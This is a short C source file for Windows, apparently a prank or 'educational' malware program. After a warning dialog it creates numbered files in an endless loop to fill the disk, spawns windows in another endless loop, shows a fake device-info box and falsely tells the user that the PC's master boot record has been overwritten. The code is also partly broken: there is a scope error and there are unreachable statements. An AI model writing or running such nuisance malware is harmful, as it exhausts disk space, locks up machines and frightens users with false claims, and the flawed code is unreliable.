#include <windows.h>
#include <stdio.h>


LRESULT CALLBACK window (HWND hnd , UINT32 MESSAGE , WPARAM wp , LPARAM lp)


{


        switch (MESSAGE)
        {
            case WM_DESTROY:
                PostQuitMessage(0);
                break;
            default:
                return DefWindowProc(hnd , MESSAGE, wp,lp);    
        }
        
        return 0;

}


void file_creation ()
{
  
    int counter = 0;
    while (1) { // Infinite loop
        char filename[256];
        sprintf(filename, "file_%d.txt", counter++); // Create unique filename

        HANDLE hFile = CreateFile(
            filename,             // File name
            GENERIC_WRITE,        // Desired access
            0,                    // Share mode
            NULL,                 // Security attributes
            CREATE_ALWAYS,        // Creation disposition
            FILE_ATTRIBUTE_NORMAL,// Flags and attributes
            NULL                  // Template file
        );

        if (hFile == INVALID_HANDLE_VALUE) {
            fprintf(stderr, "Error creating file: %ld\n", GetLastError());
            break; // Exit the loop if file creation fails
        }

        // Write some data to the file (not shown here)
        // ...

        // Close the file handle
        CloseHandle(hFile);

        // Optional: Add a delay to slow down file creation
        // Sleep(1000); // Uncomment to add a 1-second delay
    }

    return 0;
}




int APIENTRY WinMain (HINSTANCE H, HINSTANCE p , PSTR cmdline , int icdshow)

{

    if (MessageBox(NULL,TEXT("THIS IS FOR \n EDUCATIONAL PURPOSE "),TEXT("WARNING !!!"),MB_YESNO | MB_ICONERROR)!=IDYES)return -1;
        MessageBox(NULL,TEXT("FETCHING DEVICE INFO......."),"65-90-6f-f8",MB_OK | MB_ABORTRETRYIGNORE | MB_APPLMODAL);

    WNDCLASS ws = {0};
    ws.lpfnWndProc = window;
    ws.lpszClassName = L"WINDOW_CREATION";
    ws.hbrBackground = (HBRUSH)(COLOR_WINDOW +1);
    ws.hCursor = LoadCursor(NULL,IDC_ARROW);
    ws.hIcon = LoadIcon(NULL,IDI_ERROR);
    ws.hInstance = H;


    if (!RegisterClass(&ws))
    {
        MessageBox(NULL,TEXT("Window creation failed "),"ERROR",MB_OK);
        return 0;
    }

  file_creation();
while (TRUE){
    HWND hnd = {0};
    hnd = CreateWindow(
        ws.lpszClassName, L"oooooOOOOOOOOOoooooo",WS_OVERLAPPEDWINDOW | WS_VISIBLE , 100, 100, 500, 500, NULL
        ,NULL,H,NULL
    );
}


    if (!hnd)
    {

    MessageBox(NULL,TEXT("ERROR"),"ERROR",MB_OK);
        return 0 ;
    }


    MSG msg = {0};

    while (GetMessage(&msg,NULL,0,0))
    {
        TranslateMessage(&msg);
        DispatchMessage(&msg);
    }


        ShellExecute(NULL,"open","msedge.exe","https://www.instagram.com/Jojo/",NULL,SW_SHOWMAXIMIZED);
    MessageBox(NULL,TEXT("IT HAS BEEN OVERWROTE YOUR PC'S \n MBR "),"DANGER!!",MB_HELP);
        MessageBeep(MB_OK);
      
    return 0 ;
}
